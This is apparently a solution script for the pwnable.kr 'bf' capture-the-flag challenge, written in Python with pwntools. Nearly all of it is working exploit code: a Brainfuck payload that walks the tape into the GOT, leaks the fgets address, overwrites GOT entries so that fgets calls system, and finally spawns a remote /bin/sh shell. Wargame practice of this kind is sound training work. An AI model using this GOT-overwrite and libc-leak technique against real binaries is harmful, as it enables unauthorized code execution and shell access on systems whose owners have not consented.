# Pwn Tools
from pwn import *

# This was provided by the challenge
libc = ELF("./bf_libc.so")

r = remote("pwnable.kr", 9001)
r.recvline_startswith("type")

# tape - fgets@GOT ; move the pointer to GOT's fgets
payload = '<' * (0x0804A0A0 - 0x0804A010)
# Print fgets address
payload += '.>' * 4
# Remove the pointer to GOT's fgets
payload += '<' * 4
# Modify fgets to call system
payload += ',>' * 4
# memset@GOT - fgets@GOT; move the pointer to GOT's memset
payload += '<' * 4 + '>' * (0x0804A02C - 0x0804A010)
# Modify memset to call fgets
payload += ',>' * 4
# Modify GOT's putchar to re-enter main
payload += ',>' * 4
# Call putchar (main)
payload += '.'

r.sendline(payload)

fgets_addr = r.recvn(4)[::-1].encode('hex')
system_addr = int(fgets_addr, 16) - libc.symbols['fgets'] + libc.symbols['system']
gets_addr = int(fgets_addr, 16) - libc.symbols['fgets'] + libc.symbols['gets']

r.send(struct.pack('I', system_addr))
r.send(struct.pack('I', gets_addr))
# Re-enter main
r.send(struct.pack('I', 0x08048671))
r.sendline('/bin/sh')
r.interactive()

